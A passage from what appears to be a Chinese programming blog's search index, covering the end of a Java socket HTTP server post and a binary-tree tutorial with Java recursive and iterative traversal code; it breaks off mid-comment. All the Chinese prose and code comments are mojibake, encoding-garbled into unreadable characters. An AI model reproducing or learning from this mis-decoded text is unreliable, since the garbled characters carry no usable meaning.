- b.åœ¨ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œå°è¯•åˆ›å»ºä¸€ä¸ª ServerSocket å®ä¾‹å¹¶ç»‘å®šåˆ°æŒ‡å®šç«¯å£ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™ç­‰å¾… 10 ç§’åé‡è¯•ã€‚<br>    - c.å½“æˆåŠŸåˆ›å»º ServerSocket å®ä¾‹åï¼Œå°†å…¶ä½œä¸ºå‚æ•°æäº¤ç»™ bootstrapExecutor æ‰§è¡Œ ServerThread ä»»åŠ¡ã€‚<br>    - d.å…³é—­ bootstrapExecutorã€‚<br>5ã€ServerThread ç±»å®ç°äº† Runnable æ¥å£ï¼Œå®ƒæ˜¯ HTTP æœåŠ¡å™¨çš„ä¸»è¦ä»»åŠ¡ï¼š<br>    - a.serverSocket æˆå‘˜å˜é‡ï¼šä¿å­˜ä¼ é€’ç»™æ„é€ å‡½æ•°çš„ ServerSocket å®ä¾‹ã€‚<br>    - b.run() æ–¹æ³•ï¼š<br>        - åœ¨ä¸€ä¸ªæ— é™å¾ªç¯ä¸­ï¼Œè°ƒç”¨ serverSocket.accept() æ–¹æ³•ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚<br>        - å½“æ¥å—åˆ°ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œåˆ›å»ºä¸€ä¸ª HttpTask å®ä¾‹ï¼Œå°† Socket å®ä¾‹ä½œä¸ºå‚æ•°ä¼ é€’ã€‚<br>        - å°† HttpTask æäº¤ç»™ taskExecutor æ‰§è¡Œã€‚</p><p>è¿™ä¸ª HTTP æœåŠ¡å™¨çš„ä¸»è¦é€»è¾‘æ˜¯ï¼šä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹æ¥ç›‘å¬å®¢æˆ·ç«¯è¿æ¥ï¼Œå½“æœ‰æ–°çš„å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œåˆ›å»ºä¸€ä¸ª HttpTask æ¥å¤„ç†å®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚ï¼Œå¹¶å°†è¿™ä¸ªä»»åŠ¡æäº¤ç»™çº¿ç¨‹æ±  taskExecutor æ‰§è¡Œã€‚è¿™æ ·å¯ä»¥å®ç°å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚çš„å¹¶å‘å¤„ç†ã€‚<br>åˆ°è¿™é‡Œï¼Œä¸€ä¸ªåŸºäº Socket å®ç°çš„ HTTP æœåŠ¡å™¨åŸºæœ¬ä¸Šå°±æ­å»ºå®Œäº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œæµ‹è¯•äº†</p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘äºŒå‰æ ‘</title>
      <link href="/2024/10/29/algorithm/binarytree/"/>
      <url>/2024/10/29/algorithm/binarytree/</url>
      
        <content type="html"><![CDATA[<h2 id="äºŒå‰æ ‘ç†è®ºåŸºç¡€ç¯‡"><a href="#äºŒå‰æ ‘ç†è®ºåŸºç¡€ç¯‡" class="headerlink" title="äºŒå‰æ ‘ç†è®ºåŸºç¡€ç¯‡"></a>äºŒå‰æ ‘ç†è®ºåŸºç¡€ç¯‡</h2><p><img src="/2024/10/29/algorithm/binarytree/image.png"></p><h3 id="äºŒå‰æ ‘çš„ç§ç±»"><a href="#äºŒå‰æ ‘çš„ç§ç±»" class="headerlink" title="äºŒå‰æ ‘çš„ç§ç±»"></a>äºŒå‰æ ‘çš„ç§ç±»</h3><p>æ»¡äºŒå‰æ ‘ï¼šå¦‚æœä¸€æ£µäºŒå‰æ ‘åªæœ‰åº¦ä¸º0çš„ç»“ç‚¹å’Œåº¦ä¸º2çš„ç»“ç‚¹ï¼Œå¹¶ä¸”åº¦ä¸º0çš„ç»“ç‚¹åœ¨åŒä¸€å±‚ä¸Šï¼Œåˆ™è¿™æ£µäºŒå‰æ ‘ä¸ºæ»¡äºŒå‰æ ‘ã€‚ä¹Ÿå¯ä»¥è¯´æ·±åº¦ä¸ºkï¼Œæœ‰2^k-1ä¸ªèŠ‚ç‚¹çš„äºŒå‰æ ‘ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-1.png"><br>å®Œå…¨äºŒå‰æ ‘ï¼šåœ¨å®Œå…¨äºŒå‰æ ‘ä¸­ï¼Œé™¤äº†æœ€åº•å±‚èŠ‚ç‚¹å¯èƒ½æ²¡å¡«æ»¡å¤–ï¼Œå…¶ä½™æ¯å±‚èŠ‚ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§å€¼ï¼Œå¹¶ä¸”æœ€ä¸‹é¢ä¸€å±‚çš„èŠ‚ç‚¹éƒ½é›†ä¸­åœ¨è¯¥å±‚æœ€å·¦è¾¹çš„è‹¥å¹²ä½ç½®ã€‚è‹¥æœ€åº•å±‚ä¸ºç¬¬ h å±‚ï¼ˆhä»1å¼€å§‹ï¼‰ï¼Œåˆ™è¯¥å±‚åŒ…å« 1~ 2^(h-1) ä¸ªèŠ‚ç‚¹ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-2.png"><br>äºŒå‰æœç´¢æ ‘ï¼šå‰é¢ä»‹ç»çš„æ ‘ï¼Œéƒ½æ²¡æœ‰æ•°å€¼çš„ï¼Œè€ŒäºŒå‰æœç´¢æ ‘æ˜¯æœ‰æ•°å€¼çš„äº†ï¼ŒäºŒå‰æœç´¢æ ‘æ˜¯ä¸€ä¸ªæœ‰åºæ ‘ã€‚è‹¥å®ƒçš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›<br><img src="/2024/10/29/algorithm/binarytree/image-3.png"><br>å¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼šåˆè¢«ç§°ä¸ºAVLï¼ˆAdelson-Velsky and Landisï¼‰æ ‘ï¼Œä¸”å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼šå®ƒæ˜¯ä¸€æ£µç©ºæ ‘æˆ–å®ƒçš„å·¦å³ä¸¤ä¸ªå­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡1ï¼Œå¹¶ä¸”å·¦å³ä¸¤ä¸ªå­æ ‘éƒ½æ˜¯ä¸€æ£µå¹³è¡¡äºŒå‰æ ‘ã€‚C++ä¸­mapã€setã€multimapï¼Œmultisetçš„åº•å±‚å®ç°éƒ½æ˜¯å¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼Œæ‰€ä»¥mapã€setçš„å¢åˆ æ“ä½œæ—¶é—´æ—¶é—´å¤æ‚åº¦æ˜¯lognï¼Œæ³¨æ„æˆ‘è¿™é‡Œæ²¡æœ‰è¯´unordered_mapã€unordered_setï¼Œunordered_mapã€unordered_setåº•å±‚å®ç°æ˜¯å“ˆå¸Œè¡¨ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-4.png"></p><h3 id="äºŒå‰æ ‘çš„å­˜å‚¨æ–¹å¼"><a href="#äºŒå‰æ ‘çš„å­˜å‚¨æ–¹å¼" class="headerlink" title="äºŒå‰æ ‘çš„å­˜å‚¨æ–¹å¼"></a>äºŒå‰æ ‘çš„å­˜å‚¨æ–¹å¼</h3><p>äºŒå‰æ ‘å¯ä»¥é“¾å¼å­˜å‚¨ï¼Œä¹Ÿå¯ä»¥é¡ºåºå­˜å‚¨ã€‚<br>é‚£ä¹ˆé“¾å¼å­˜å‚¨æ–¹å¼å°±ç”¨æŒ‡é’ˆï¼Œ é¡ºåºå­˜å‚¨çš„æ–¹å¼å°±æ˜¯ç”¨æ•°ç»„ã€‚<br>é¡¾åæ€ä¹‰å°±æ˜¯é¡ºåºå­˜å‚¨çš„å…ƒç´ åœ¨å†…å­˜æ˜¯è¿ç»­åˆ†å¸ƒçš„ï¼Œè€Œé“¾å¼å­˜å‚¨åˆ™æ˜¯é€šè¿‡æŒ‡é’ˆæŠŠåˆ†å¸ƒåœ¨å„ä¸ªåœ°å€çš„èŠ‚ç‚¹ä¸²è”ä¸€èµ·ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-5.png"><br>é¡ºåºå­˜å‚¨<br><img src="/2024/10/29/algorithm/binarytree/image-6.png"><br>ç”¨æ•°ç»„æ¥å­˜å‚¨äºŒå‰æ ‘å¦‚ä½•éå†çš„å‘¢ï¼Ÿå¦‚æœçˆ¶èŠ‚ç‚¹çš„æ•°ç»„ä¸‹æ ‡æ˜¯ iï¼Œé‚£ä¹ˆå®ƒçš„å·¦å­©å­å°±æ˜¯ i * 2 + 1ï¼Œå³å­©å­å°±æ˜¯ i * 2 + 2ã€‚ä½†æ˜¯ç”¨é“¾å¼è¡¨ç¤ºçš„äºŒå‰æ ‘ï¼Œæ›´æœ‰åˆ©äºæˆ‘ä»¬ç†è§£ï¼Œæ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬éƒ½æ˜¯ç”¨é“¾å¼å­˜å‚¨äºŒå‰æ ‘ã€‚</p><h3 id="äºŒå‰æ ‘çš„éå†æ–¹å¼"><a href="#äºŒå‰æ ‘çš„éå†æ–¹å¼" class="headerlink" title="äºŒå‰æ ‘çš„éå†æ–¹å¼"></a>äºŒå‰æ ‘çš„éå†æ–¹å¼</h3><p>äºŒå‰æ ‘ä¸»è¦æœ‰ä¸¤ç§éå†æ–¹å¼ï¼š</p><ol><li>æ·±åº¦ä¼˜å…ˆéå†ï¼šå…ˆå¾€æ·±èµ°ï¼Œé‡åˆ°å¶å­èŠ‚ç‚¹å†å¾€å›èµ°ã€‚<ul><li>å‰åºéå†ï¼ˆé€’å½’æ³•ï¼Œè¿­ä»£æ³•ï¼‰</li><li>ä¸­åºéå†ï¼ˆé€’å½’æ³•ï¼Œè¿­ä»£æ³•ï¼‰</li><li>ååºéå†ï¼ˆé€’å½’æ³•ï¼Œè¿­ä»£æ³•ï¼‰<br><img src="/2024/10/29/algorithm/binarytree/image-7.png"></li></ul></li><li>å¹¿åº¦ä¼˜å…ˆéå†ï¼šä¸€å±‚ä¸€å±‚çš„å»éå†ã€‚<ul><li>å±‚æ¬¡éå†ï¼ˆè¿­ä»£æ³•ï¼‰<br>è¿™ä¸¤ç§éå†æ˜¯å›¾è®ºä¸­æœ€åŸºæœ¬çš„ä¸¤ç§éå†æ–¹å¼ï¼Œåé¢åœ¨ä»‹ç»å›¾è®ºçš„æ—¶å€™ è¿˜ä¼šä»‹ç»åˆ°ã€‚<br>æˆ‘ä»¬åšäºŒå‰æ ‘ç›¸å…³é¢˜ç›®ï¼Œç»å¸¸ä¼šä½¿ç”¨é€’å½’çš„æ–¹å¼æ¥å®ç°æ·±åº¦ä¼˜å…ˆéå†ï¼Œä¹Ÿå°±æ˜¯å®ç°å‰ä¸­ååºéå†ï¼Œä½¿ç”¨é€’å½’æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„ã€‚<br>ä¹‹å‰æˆ‘ä»¬è®²æ ˆä¸é˜Ÿåˆ—çš„æ—¶å€™ï¼Œå°±è¯´è¿‡æ ˆå…¶å®å°±æ˜¯é€’å½’çš„ä¸€ç§å®ç°ç»“æ„ï¼Œä¹Ÿå°±è¯´å‰ä¸­ååºéå†çš„é€»è¾‘å…¶å®éƒ½æ˜¯å¯ä»¥å€ŸåŠ©æ ˆä½¿ç”¨é€’å½’çš„æ–¹å¼æ¥å®ç°çš„ã€‚<br>è€Œå¹¿åº¦ä¼˜å…ˆéå†çš„å®ç°ä¸€èˆ¬ä½¿ç”¨é˜Ÿåˆ—æ¥å®ç°ï¼Œè¿™ä¹Ÿæ˜¯é˜Ÿåˆ—å…ˆè¿›å…ˆå‡ºçš„ç‰¹ç‚¹æ‰€å†³å®šçš„ï¼Œå› ä¸ºéœ€è¦å…ˆè¿›å…ˆå‡ºçš„ç»“æ„ï¼Œæ‰èƒ½ä¸€å±‚ä¸€å±‚çš„æ¥éå†äºŒå‰æ ‘ã€‚</li></ul></li></ol><p>äºŒå‰æ ‘çš„é€’å½’éå†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‰åºéå†Â·é€’å½’Â·LC144_äºŒå‰æ ‘çš„å‰åºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        preorder(root, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(root.val);</span><br><span class="line">        preorder(root.left, result);</span><br><span class="line">        preorder(root.right, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¸­åºéå†Â·é€’å½’Â·LC94_äºŒå‰æ ‘çš„ä¸­åºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        inorder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inorder(root.left, list);</span><br><span class="line">        list.add(root.val);             <span class="comment">// æ³¨æ„è¿™ä¸€å¥</span></span><br><span class="line">        inorder(root.right, list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ååºéå†Â·é€’å½’Â·LC145_äºŒå‰æ ‘çš„ååºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        postorder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">postorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postorder(root.left, list);</span><br><span class="line">        postorder(root.right, list);</span><br><span class="line">        list.add(root.val);             <span class="comment">// æ³¨æ„è¿™ä¸€å¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºŒå‰æ ‘çš„è¿­ä»£éå†ï¼šæˆ‘ä»¬åœ¨æ ˆä¸é˜Ÿåˆ—ï¼šåŒ¹é…é—®é¢˜éƒ½æ˜¯æ ˆçš„å¼ºé¡¹ (opens new window)ä¸­æåˆ°äº†ï¼Œé€’å½’çš„å®ç°å°±æ˜¯ï¼šæ¯ä¸€æ¬¡é€’å½’è°ƒç”¨éƒ½ä¼šæŠŠå‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•°å€¼å’Œè¿”å›åœ°å€ç­‰å‹å…¥è°ƒç”¨æ ˆä¸­ï¼Œç„¶åé€’å½’è¿”å›çš„æ—¶å€™ï¼Œä»æ ˆé¡¶å¼¹å‡ºä¸Šä¸€æ¬¡é€’å½’çš„å„é¡¹å‚æ•°ï¼Œæ‰€ä»¥è¿™å°±æ˜¯é€’å½’ä¸ºä»€ä¹ˆå¯ä»¥è¿”å›ä¸Šä¸€å±‚ä½ç½®çš„åŸå› ã€‚<br>å‰åºéå†ï¼ˆè¿­ä»£æ³•ï¼‰:å‰åºéå†æ˜¯ä¸­å·¦å³ï¼Œæ¯æ¬¡å…ˆå¤„ç†çš„æ˜¯ä¸­é—´èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå…ˆå°†æ ¹èŠ‚ç‚¹æ”¾å…¥æ ˆä¸­ï¼Œç„¶åå°†å³å­©å­åŠ å…¥æ ˆï¼Œå†åŠ å…¥å·¦å­©å­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸­åºéå†é¡ºåº: å·¦-ä¸­-å³ å…¥æ ˆé¡ºåºï¼š å·¦-å³</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">               stack.push(cur);</span><br><span class="line">               cur = cur.left;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               cur = stack.pop();</span><br><span class="line">               result.add(cur.val);</span><br><span class="line">               cur = cur.right;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ååºéå†é¡ºåº å·¦-å³-ä¸­ å…¥æ ˆé¡ºåºï¼šä¸­-å·¦-å³ å‡ºæ ˆé¡ºåºï¼šä¸­-å³-å·¦ï¼Œ æœ€åç¿»è½¬ç»“æœ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºŒå‰æ ‘çš„ç»Ÿä¸€è¿­ä»£æ³•:æˆ‘ä»¬ä»¥ä¸­åºéå†ä¸ºä¾‹ï¼Œæ— æ³•åŒæ—¶è§£å†³è®¿é—®èŠ‚ç‚¹ï¼ˆéå†èŠ‚ç‚¹ï¼‰å’Œå¤„ç†èŠ‚ç‚¹ï¼ˆå°†å…ƒç´ æ”¾è¿›ç»“æœé›†ï¼‰ä¸ä¸€è‡´çš„æƒ…å†µã€‚é‚£æˆ‘ä»¬å°±å°†è®¿é—®çš„èŠ‚ç‚¹æ”¾å…¥æ ˆä¸­ï¼ŒæŠŠè¦å¤„ç†çš„èŠ‚ç‚¹ä¹Ÿæ”¾å…¥æ ˆä¸­ä½†æ˜¯è¦åšæ ‡è®°ã€‚å¦‚ä½•æ ‡è®°å‘¢ï¼Œå°±æ˜¯è¦å¤„ç†çš„èŠ‚ç‚¹æ”¾å…¥æ ˆä¹‹åï¼Œç´§æ¥ç€æ”¾å…¥ä¸€ä¸ªç©ºæŒ‡é’ˆä½œä¸ºæ ‡è®°ã€‚ è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥å«åšæ ‡è®°æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿­ä»£æ³•å‰åºéå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                st.pop(); <span class="comment">// å°†è¯¥èŠ‚ç‚¹å¼¹å‡ºï¼Œé¿å…é‡å¤æ“ä½œï¼Œä¸‹é¢å†å°†å³ä¸­å·¦èŠ‚ç‚¹æ·»åŠ åˆ°æ ˆä¸­</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// æ·»åŠ å³èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// æ·»åŠ å·¦èŠ‚ç‚¹ï¼ˆç©ºèŠ‚ç‚¹ä¸å…¥æ ˆï¼‰</span></span><br><span class="line">                st.push(node);                          <span class="comment">// æ·»åŠ ä¸­èŠ‚ç‚¹</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// ä¸­èŠ‚ç‚¹è®¿é—®è¿‡ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å¤„ç†ï¼ŒåŠ å…¥ç©ºèŠ‚ç‚¹åšä¸ºæ ‡è®°ã€‚</span></span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 